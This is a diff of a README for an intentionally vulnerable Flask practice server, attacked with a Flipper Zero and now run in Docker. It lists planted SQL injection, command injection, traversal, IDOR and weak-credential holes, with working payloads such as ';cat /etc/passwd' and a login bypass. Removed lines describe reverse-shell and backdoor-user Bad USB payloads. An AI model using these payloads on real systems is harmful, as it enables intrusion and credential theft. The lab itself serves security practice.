@@ -1,62 +1,52 @@
 # Flipper Lab
 
-An intentionally vulnerable web server built for pen testing practice with a Flipper Zero and Raspberry Pi. The server runs on the Pi; you attack it from your Mac over the network or from the Flipper over USB.
+An intentionally vulnerable web server for pen testing practice with a Flipper Zero and Raspberry Pi.
 
-> **For authorized testing only. Run this on hardware you own.**
+**Everything runs inside Docker** — command injection, directory traversal, and Bad USB payloads all hit the container's isolated environment, not your Pi's real OS. Wipe and start over in one command.
+
+> For authorized testing on hardware you own only.
 
 ---
 
-## Setup
+## Quick start
 
 ```bash
 git clone https://github.com/levibmackay/flipper-lab.git
 cd flipper-lab
-pip install -r requirements.txt
-```
-
-### Start everything (server + live dashboard in tmux)
-
-```bash
 bash start.sh
 ```
 
-This opens two tmux panes side by side:
-- **Left** — the vulnerable Flask server on port 5000
-- **Right** — a live Rich dashboard showing every request and flagging attacks in real time
+This builds the Docker container, starts the server on port 5000, and opens the live attack dashboard in your terminal. SSH in from your Mac and run it there — you'll see every hit in real time.
 
-You can SSH into the Pi from your Mac and run `bash start.sh` to see both panes in your terminal.
-
-### Or start them separately
+### Wipe and start over
 
 ```bash
-# Terminal 1 — server
-python3 server/app.py
-
-# Terminal 2 — dashboard
-python3 monitor/dashboard.py
+bash start.sh wipe
 ```
+
+Destroys the container, clears all state and logs, then rebuilds from scratch. Takes about 10 seconds.
 
 ---
 
 ## Vulnerabilities
 
-| # | Type | Where |
-|---|------|--------|
+| # | Type | Endpoint |
+|---|------|----------|
 | 1 | SQL Injection | `POST /login` — username/password fields |
 | 2 | Command Injection | `GET /tools/ping?host=` |
 | 3 | Directory Traversal | `GET /files?file=` |
 | 4 | IDOR | `GET /api/user/<id>` — no ownership check |
 | 5 | Weak credentials | `/admin` — `admin / password123` |
 
-### Example attacks (from your Mac or browser)
+### Attacks to try from your Mac browser
 
-**SQL Injection — bypass login**
+**SQL Injection — bypass login entirely**
 ```
 Username: ' OR '1'='1' --
 Password: anything
 ```
 
-**Command Injection — run arbitrary commands**
+**Command Injection — run shell commands inside the container**
 ```
 http://<pi-ip>:5000/tools/ping?host=127.0.0.1;id
 http://<pi-ip>:5000/tools/ping?host=127.0.0.1;cat /etc/passwd
@@ -65,49 +55,48 @@ http://<pi-ip>:5000/tools/ping?host=127.0.0.1;cat /etc/passwd
 **Directory Traversal — read files outside the web root**
 ```
 http://<pi-ip>:5000/files?file=../flag.txt
-http://<pi-ip>:5000/files?file=../../etc/passwd
+http://<pi-ip>:5000/files?file=../../../etc/passwd
 ```
 
-**IDOR — read any user's profile**
+**IDOR — access any user's data**
 ```
 http://<pi-ip>:5000/api/user/1
 http://<pi-ip>:5000/api/user/2
-```
-
-**Admin panel — default creds**
-```
-http://<pi-ip>:5000/admin
-Login as admin / password123 to see the flag
 ```
 
 ---
 
 ## Flipper Zero — Bad USB Payloads
 
-Plug your Flipper into the Pi's USB port. Load a payload from `payloads/` onto the Flipper's SD card under `badusb/`.
+The payloads use `curl` to attack the server through its web vulnerabilities.
+This keeps everything inside Docker — nothing touches your Pi's real OS.
 
-| Payload | What it does |
-|---------|-------------|
-| `exfil_flag.txt` | Opens a terminal and cats `flag.txt` to the screen |
-| `reverse_shell.txt` | Drops a bash reverse shell back to your machine (edit IP first) |
-| `add_backdoor_user.txt` | Adds a user `flipper / flipper123` via sudo |
+### How to load
 
-**To load on Flipper:**
-1. Copy the `.txt` file to `/SD/badusb/` on your Flipper's SD card
-2. On the Flipper: `Bad USB → <payload name> → Run`
-3. The Flipper types the payload as if it were a keyboard
+1. Copy a `.txt` file from `payloads/` to `/SD/badusb/` on your Flipper's SD card
+2. Plug Flipper into the Pi's USB port
+3. On the Flipper: **Bad USB → `<payload name>` → Run**
+4. Watch the dashboard — the attack shows up in red
+
+### Payloads
+
+| File | What it does |
+|------|-------------|
+| `exfil_flag.txt` | Reads `flag.txt` via directory traversal |
+| `sqli_bypass.txt` | Bypasses login with SQL injection, then hits `/admin` |
+| `cmd_injection.txt` | Runs `id` and `whoami` inside the container via the ping tool |
+| `traversal_passwd.txt` | Reads the container's `/etc/passwd` via traversal |
 
 ---
 
-## Watching from SSH
+## Why Docker?
 
-SSH into the Pi from your Mac, then run `bash start.sh`. The tmux session splits the screen — server logs on the left, the attack dashboard on the right. Every request is logged and attacks are highlighted in red as they come in.
+Without Docker, Bad USB payloads that run system commands would affect your actual Pi — creating users, dropping shells, etc. Inside Docker:
 
-```bash
-ssh pi@<pi-ip>
-cd flipper-lab
-bash start.sh
-```
+- The container has its own filesystem, users, and network namespace
+- `cat /etc/passwd` reads the container's passwd file, not your Pi's
+- `wipe` blows away the container completely and starts fresh
+- Your Pi's OS is never touched
 
 ---
 
@@ -116,13 +105,15 @@ bash start.sh
 ```
 flipper-lab/
 ├── server/
-│   ├── app.py          # Vulnerable Flask server
-│   ├── flag.txt        # Target for Bad USB exfil payloads
-│   ├── static/         # Served files (traversal target)
-│   └── templates/      # HTML pages
+│   ├── app.py              # Vulnerable Flask server
+│   ├── flag.txt            # Target for exfil payloads
+│   ├── static/             # File browser root (traversal target)
+│   └── templates/          # HTML pages
 ├── monitor/
-│   └── dashboard.py    # Rich live attack dashboard
-├── payloads/           # Flipper Zero DuckyScript Bad USB payloads
-├── start.sh            # Launches both server and dashboard in tmux
-└── requirements.txt
+│   └── dashboard.py        # Rich live attack dashboard
+├── payloads/               # Flipper Zero DuckyScript Bad USB payloads
+├── Dockerfile
+├── docker-compose.yml
+├── start.sh                # Start everything / wipe
+└── requirements.txt        # Dashboard dependencies (Rich)
 ```
